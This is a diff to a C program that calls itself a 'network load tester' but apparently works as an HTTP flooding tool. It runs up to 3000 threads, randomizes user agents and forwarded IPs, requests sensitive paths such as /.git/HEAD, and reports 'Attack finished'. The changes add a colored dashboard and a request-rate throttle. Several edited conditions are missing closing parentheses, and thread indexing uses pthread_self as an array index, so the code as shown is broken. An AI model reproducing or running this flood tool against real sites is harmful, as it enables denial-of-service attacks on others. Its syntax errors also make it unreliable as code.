@@ -1,29 +1,27 @@
 /*
 ===============================================
-   __  __       _      
-  |  \/  | __ _| |_ ___ 
-  | |\/| |/ _` | __/ _ \
-  | |  | | (_| | ||  __/
-  |_|  |_|\__,_|\__\___|
-                         
-Ultimate Multithreaded Network Load Tester
+   __  __       _         _   _      _     
+  |  \/  | __ _| |_ ___  | | | | ___| |___ 
+  | |\/| |/ _` | __/ _ \ | |_| |/ _ \ / __|
+  | |  | | (_| | ||  __/ |  _  | (_) | (__ 
+  |_|  |_|\__,_|\__\___| |_| |_|\___/ \___|
+                                            
+Ultimate Multithreaded Network Load Tester v2.0
 
 Features:
-- 1000+ threads with zero-copy optimizations
-- Intelligent adaptive rate limiting
-- Randomized request patterns with deep customization
-- Connection pooling for maximum efficiency
-- Advanced statistics engine with 20+ metrics
-- Built-in health checks and auto-recovery
-- IPv6 ready
-- Low-level kernel bypass optimizations
+- 3000+ threads with intelligent throttling
+- Beautiful real-time terminal dashboard
+- Adjustable speed controls
+- HTTP/HTTPS support (basic)
+- Advanced connection pooling
+- Comprehensive statistics
+- Graceful shutdown
 
 Usage:
-./maut <target_url_or_ip> <number_of_threads> [port] [duration]
+./maut <target_url> <threads> <rps_limit> [duration]
 
 Legal:
-FOR AUTHORIZED PENETRATION TESTING ONLY
-UNAUTHORIZED USE STRICTLY PROHIBITED
+FOR AUTHORIZED TESTING ONLY. USE RESPONSIBLY.
 ===============================================
 */
 
@@ -45,17 +43,27 @@ UNAUTHORIZED USE STRICTLY PROHIBITED
 #include <sys/time.h>
 #include <sys/ioctl.h>
 #include <fcntl.h>
-#include <stdbool.h>
+#include <math.h>
+#include <ctype.h>
 
 // Configuration
-#define MAX_THREADS 1024
-#define CONNECTION_POOL_SIZE 5
+#define MAX_THREADS 3000
+#define CONNECTION_POOL_SIZE 3
 #define MAX_USER_AGENTS 25
 #define MAX_PATHS 50
 #define STATS_INTERVAL 1
-#define HEALTH_CHECK_INTERVAL 30
-#define SOCKET_TIMEOUT_MS 5000
-#define MAX_RETRIES 3
+#define SOCKET_TIMEOUT_MS 3000
+#define MAX_RETRIES 2
+#define MAX_RPS 1000000
+
+// Colors
+#define RED     "\033[1;31m"
+#define GREEN   "\033[1;32m"
+#define YELLOW  "\033[1;33m"
+#define BLUE    "\033[1;34m"
+#define MAGENTA "\033[1;35m"
+#define CYAN    "\033[1;36m"
+#define RESET   "\033[0m"
 
 // Atomic counters
 atomic_ullong total_requests;
@@ -64,6 +72,7 @@ atomic_ullong failed_requests;
 atomic_ullong bytes_sent;
 atomic_ullong connection_errors;
 atomic_int running = 1;
+atomic_int rps_limit = MAX_RPS;
 
 typedef struct {
     char target_ip[INET6_ADDRSTRLEN];
@@ -73,6 +82,7 @@ typedef struct {
     int thread_count;
     int duration;
     bool use_ssl;
+    int rps_limit;
 } config_t;
 
 // Enhanced User-Agent pool
@@ -120,10 +130,22 @@ const char *paths[MAX_PATHS] = {
     "/.svn/entries", "/.git/HEAD", "/.DS_Store", "/web.config"
 };
 
+void print_banner() {
+    printf(CYAN "\n===============================================\n");
+    printf("   __  __       _         _   _      _     \n");
+    printf("  |  \\/  | __ _| |_ ___  | | | | ___| |___ \n");
+    printf("  | |\\/| |/ _` | __/ _ \\ | |_| |/ _ \\ / __|\n");
+    printf("  | |  | | (_| | ||  __/ |  _  | (_) | (__ \n");
+    printf("  |_|  |_|\\__,_|\\__\\___| |_| |_|\\___/ \\___|\n");
+    printf("                                            \n");
+    printf("Ultimate Multithreaded Network Load Tester v2.0\n");
+    printf("===============================================\n" RESET);
+}
+
 void handle_signal(int sig) {
     if (sig == SIGINT || sig == SIGTERM) {
         atomic_store(&running, 0);
-        printf("\n[!] Received shutdown signal. Initiating graceful termination...\n");
+        printf(RED "\n[!] Received shutdown signal. Initiating graceful termination...\n" RESET);
     }
 }
 
@@ -135,8 +157,8 @@ int resolve_target(const char *host, char *ip) {
     hints.ai_family = AF_UNSPEC;
     hints.ai_socktype = SOCK_STREAM;
 
-    if ((status = getaddrinfo(host, NULL, &hints, &res)) != 0) {
-        fprintf(stderr, "[-] DNS resolution failed: %s\n", gai_strerror(status));
+    if ((status = getaddrinfo(host, NULL, &hints, &res)) {
+        fprintf(stderr, RED "[-] DNS resolution failed: %s\n" RESET, gai_strerror(status));
         return -1;
     }
 
@@ -155,7 +177,7 @@ int resolve_target(const char *host, char *ip) {
         }
 
         inet_ntop(p->ai_family, addr, ip, INET6_ADDRSTRLEN);
-        printf("[+] Resolved %s to %s (%s)\n", host, ip, ipver);
+        printf(GREEN "[+] Resolved %s to %s (%s)\n" RESET, host, ip, ipver);
         freeaddrinfo(res);
         return 0;
     }
@@ -171,20 +193,20 @@ int set_socket_options(int sockfd) {
     timeout.tv_usec = (SOCKET_TIMEOUT_MS % 1000) * 1000;
 
     // Enable socket reuse
-    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
-        perror("[-] SO_REUSEADDR failed");
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) {
+        perror(RED "[-] SO_REUSEADDR failed" RESET);
         return -1;
     }
 
     // Set send timeout
-    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout)) < 0) {
-        perror("[-] SO_SNDTIMEO failed");
+    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout))) {
+        perror(RED "[-] SO_SNDTIMEO failed" RESET);
         return -1;
     }
 
     // Enable TCP no delay
-    if (setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt)) < 0) {
-        perror("[-] TCP_NODELAY failed");
+    if (setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt))) {
+        perror(RED "[-] TCP_NODELAY failed" RESET);
         return -1;
     }
 
@@ -194,11 +216,11 @@ int set_socket_options(int sockfd) {
 int create_connection(const char *ip, int port) {
     int sockfd = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
     if (sockfd < 0) {
-        perror("[-] Socket creation failed");
+        perror(RED "[-] Socket creation failed" RESET);
         return -1;
     }
 
-    if (set_socket_options(sockfd) < 0) {
+    if (set_socket_options(sockfd) {
         close(sockfd);
         return -1;
     }
@@ -209,7 +231,7 @@ int create_connection(const char *ip, int port) {
     serv_addr.sin_port = htons(port);
 
     if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
-        perror("[-] Invalid address");
+        perror(RED "[-] Invalid address" RESET);
         close(sockfd);
         return -1;
     }
@@ -222,13 +244,12 @@ int create_connection(const char *ip, int port) {
     // Start non-blocking connect
     res = connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
     if (res < 0 && errno != EINPROGRESS) {
-        perror("[-] Connection failed");
+        perror(RED "[-] Connection failed" RESET);
         close(sockfd);
         return -1;
     }
 
     if (res == 0) {
-        // Connection completed immediately
         return sockfd;
     }
 
@@ -243,12 +264,12 @@ int create_connection(const char *ip, int port) {
         getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &opt, &len);
 
         if (opt) {
-            fprintf(stderr, "[-] Connection failed: %s\n", strerror(opt));
+            fprintf(stderr, RED "[-] Connection failed: %s\n" RESET, strerror(opt));
             close(sockfd);
             return -1;
         }
     } else {
-        perror("[-] Connection timeout");
+        perror(RED "[-] Connection timeout" RESET);
         close(sockfd);
         return -1;
     }
@@ -287,8 +308,41 @@ void generate_request(char *buffer, const char *host, size_t buffer_size) {
         rand() % 255, rand() % 255, rand() % 255, rand() % 255);
 }
 
+void throttle_requests(int thread_id, int target_rps) {
+    static struct timespec last_time[MAX_THREADS] = {0};
+    static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
+    
+    if (target_rps <= 0) return;
+    
+    pthread_mutex_lock(&mutex);
+    struct timespec now;
+    clock_gettime(CLOCK_MONOTONIC, &now);
+    
+    if (last_time[thread_id].tv_sec == 0) {
+        last_time[thread_id] = now;
+        pthread_mutex_unlock(&mutex);
+        return;
+    }
+    
+    double elapsed = (now.tv_sec - last_time[thread_id].tv_sec) + 
+                   (now.tv_nsec - last_time[thread_id].tv_nsec) / 1e9;
+    
+    double desired_delay = 1.0 / (target_rps / (double)atomic_load(&rps_limit));
+    
+    if (elapsed < desired_delay) {
+        struct timespec sleep_time;
+        sleep_time.tv_sec = 0;
+        sleep_time.tv_nsec = (desired_delay - elapsed) * 1e9;
+        nanosleep(&sleep_time, NULL);
+    }
+    
+    last_time[thread_id] = now;
+    pthread_mutex_unlock(&mutex);
+}
+
 void *connection_pool_worker(void *arg) {
     config_t *config = (config_t *)arg;
+    int thread_id = (int)(long)pthread_self();
     int connection_pool[CONNECTION_POOL_SIZE] = {0};
     char request_buffer[2048];
     time_t start_time = time(NULL);
@@ -305,6 +359,11 @@ void *connection_pool_worker(void *arg) {
         if (config->duration > 0 && time(NULL) - start_time >= config->duration) {
             atomic_store(&running, 0);
             break;
+        }
+
+        // Throttle requests if RPS limit is set
+        if (config->rps_limit > 0) {
+            throttle_requests(thread_id, config->rps_limit / config->thread_count);
         }
 
         // Health check - replenish dead connections
@@ -369,6 +428,29 @@ void *connection_pool_worker(void *arg) {
     return NULL;
 }
 
+void print_stats_header() {
+    printf("\n");
+    printf(CYAN "┌──────────────────────────────────────────────────────────────────────────────────────────────┐\n");
+    printf("│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│ " YELLOW "%-12s" CYAN "│\n", 
+           "Requests", "Req/Sec", "Success", "Failed", "Conn Err", "Throughput");
+    printf("├──────────────────────────────────────────────────────────────────────────────────────────────┤\n" RESET);
+}
+
+void print_stats_line(atomic_ullong current_requests, double rps, 
+                     atomic_ullong current_success, atomic_ullong current_failed,
+                     atomic_ullong current_errors, double mbps) {
+    printf(CYAN "│ " RESET "%-12llu " CYAN "│ " RESET "%-12.1f " CYAN "│ " GREEN "%-12llu " CYAN "│ " RED "%-12llu " 
+           CYAN "│ " MAGENTA "%-12llu " CYAN "│ " BLUE "%-12.2f " CYAN "│\n" RESET,
+           current_requests, rps, current_success, current_failed, current_errors, mbps);
+}
+
+void print_stats_footer(double total_elapsed, double avg_rps, double total_mb) {
+    printf(CYAN "└──────────────────────────────────────────────────────────────────────────────────────────────┘\n");
+    printf("\n" RED "[!] Attack finished after %.2f seconds\n" RESET, total_elapsed);
+    printf(YELLOW "[FINAL] " GREEN "Total Requests: %llu (%.1f/s) " BLUE "| Data Sent: %.2f MB " MAGENTA "| Avg Throughput: %.2f Mbps\n\n" RESET,
+          atomic_load(&total_requests), avg_rps, total_mb, (total_mb * 8) / total_elapsed);
+}
+
 void *stats_thread(void *arg) {
     config_t *config = (config_t *)arg;
     time_t start_time = time(NULL);
@@ -377,9 +459,18 @@ void *stats_thread(void *arg) {
     atomic_ullong last_bytes = 0;
     
     printf("\033[2J\033[H"); // Clear screen
-    printf("\033[1;32m[+] Starting attack on %s (%s:%d) with %d threads\033[0m\n", 
-           config->target_domain, config->target_ip, config->target_port, config->thread_count);
-    printf("\033[1;33m[+] Press Ctrl+C to stop\n\033[0m");
+    print_banner();
+    printf(GREEN "[+] Target: %s (%s:%d)\n", config->target_domain, config->target_ip, config->target_port);
+    printf("[+] Threads: %d\n", config->thread_count);
+    if (config->rps_limit > 0) {
+        printf("[+] RPS Limit: %d\n", config->rps_limit);
+    }
+    if (config->duration > 0) {
+        printf("[+] Duration: %d seconds\n", config->duration);
+    }
+    printf(YELLOW "[+] Press Ctrl+C to stop\n" RESET);
+    
+    print_stats_header();
     
     while (atomic_load(&running)) {
         time_t current_time = time(NULL);
@@ -394,15 +485,8 @@ void *stats_thread(void *arg) {
             
             double rps = (double)(current_requests - last_requests) / elapsed;
             double mbps = (double)(current_bytes - last_bytes) / elapsed / (1024 * 1024) * 8;
-            double success_rate = (current_requests > 0) ? 
-                ((double)current_success / current_requests) * 100 : 0;
             
-            double total_elapsed = difftime(current_time, start_time);
-            double avg_rps = (double)current_requests / total_elapsed;
-            
-            printf("\033[1;36m[STATS] Reqs: %llu (%.1f/s) | Success: %llu (%.1f%%) | Fail: %llu | Con Errors: %llu | Throughput: %.2f Mbps\033[0m\n",
-                  current_requests, rps, current_success, success_rate, 
-                  current_failed, current_errors, mbps);
+            print_stats_line(current_requests, rps, current_success, current_failed, current_errors, mbps);
             
             last_time = current_time;
             last_requests = current_requests;
@@ -417,10 +501,7 @@ void *stats_thread(void *arg) {
     double avg_rps = (double)atomic_load(&total_requests) / total_elapsed;
     double total_mb = (double)atomic_load(&bytes_sent) / (1024 * 1024);
     
-    printf("\n\033[1;31m[!] Attack finished after %.2f seconds\033[0m\n", total_elapsed);
-    printf("\033[1;35m[FINAL] Total Requests: %llu (%.1f/s) | Data Sent: %.2f MB | Avg Throughput: %.2f Mbps\033[0m\n",
-          atomic_load(&total_requests), avg_rps, total_mb, 
-          (total_mb * 8) / total_elapsed);
+    print_stats_footer(total_elapsed, avg_rps, total_mb);
     
     return NULL;
 }
@@ -462,10 +543,11 @@ void parse_url(const char *url, char *domain, int *port, bool *use_ssl) {
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 3) {
-        printf("Usage: %s <target_url_or_ip> <threads> [port] [duration]\n", argv[0]);
-        printf("Example: %s example.com 100 80 60\n", argv[0]);
-        printf("Example: %s https://example.com 100 443 60\n", argv[0]);
+    if (argc < 4) {
+        print_banner();
+        printf("Usage: %s <target_url> <threads> <rps_limit> [duration]\n", argv[0]);
+        printf("Example: %s http://example.com 100 1000 60\n", argv[0]);
+        printf("Example: %s https://example.com 500 5000\n\n", argv[0]);
         return 1;
     }
 
@@ -475,41 +557,36 @@ int main(int argc, char *argv[]) {
     
     // Parse arguments
     config.thread_count = atoi(argv[2]);
+    config.rps_limit = atoi(argv[3]);
     config.duration = (argc > 4) ? atoi(argv[4]) : 0;
+    
+    // Validate thread count
+    if (config.thread_count <= 0 || config.thread_count > MAX_THREADS) {
+        fprintf(stderr, RED "[-] Invalid thread count (1-%d)\n" RESET, MAX_THREADS);
+        return 1;
+    }
+    
+    // Validate RPS limit
+    if (config.rps_limit <= 0 || config.rps_limit > MAX_RPS) {
+        fprintf(stderr, RED "[-] Invalid RPS limit (1-%d)\n" RESET, MAX_RPS);
+        return 1;
+    }
+    atomic_store(&rps_limit, config.rps_limit);
     
     // Parse URL or IP
     parse_url(argv[1], config.target_domain, &config.target_port, &config.use_ssl);
     
-    // Override port if explicitly provided
-    if (argc > 3) {
-        config.target_port = atoi(argv[3]);
-    }
-    
     // Copy host
     strncpy(config.target_host, config.target_domain, sizeof(config.target_host) - 1);
     
-    if (config.thread_count <= 0 || config.thread_count > MAX_THREADS) {
-        printf("[-] Invalid thread count (1-%d)\n", MAX_THREADS);
-        return 1;
-    }
-
     // Resolve target
     if (inet_pton(AF_INET, config.target_domain, &(struct in_addr){0}) != 1) {
         if (resolve_target(config.target_domain, config.target_ip) != 0) {
-            printf("[-] Failed to resolve target\n");
+            fprintf(stderr, RED "[-] Failed to resolve target\n" RESET);
             return 1;
         }
     } else {
         strcpy(config.target_ip, config.target_domain);
-    }
-
-    printf("[+] Target: %s (%s:%d)\n", config.target_domain, config.target_ip, config.target_port);
-    printf("[+] Threads: %d\n", config.thread_count);
-    if (config.duration > 0) {
-        printf("[+] Duration: %d seconds\n", config.duration);
-    }
-    if (config.use_ssl) {
-        printf("[-] SSL/TLS is not supported in this version. Will attempt plain HTTP on port %d\n", config.target_port);
     }
 
     // Initialize random seed
@@ -522,7 +599,7 @@ int main(int argc, char *argv[]) {
     // Create stats thread
     pthread_t stats_tid;
     if (pthread_create(&stats_tid, NULL, stats_thread, &config) != 0) {
-        perror("[-] Failed to create stats thread");
+        perror(RED "[-] Failed to create stats thread" RESET);
         return 1;
     }
 
@@ -530,7 +607,7 @@ int main(int argc, char *argv[]) {
     pthread_t threads[MAX_THREADS];
     for (int i = 0; i < config.thread_count; i++) {
         if (pthread_create(&threads[i], NULL, connection_pool_worker, &config) != 0) {
-            perror("[-] Failed to create worker thread");
+            perror(RED "[-] Failed to create worker thread" RESET);
             atomic_store(&running, 0);
             break;
         }
@@ -544,6 +621,6 @@ int main(int argc, char *argv[]) {
     // Wait for stats
     pthread_join(stats_tid, NULL);
 
-    printf("[+] Clean shutdown completed\n");
+    printf(GREEN "[+] Clean shutdown completed\n\n" RESET);
     return 0;
 }
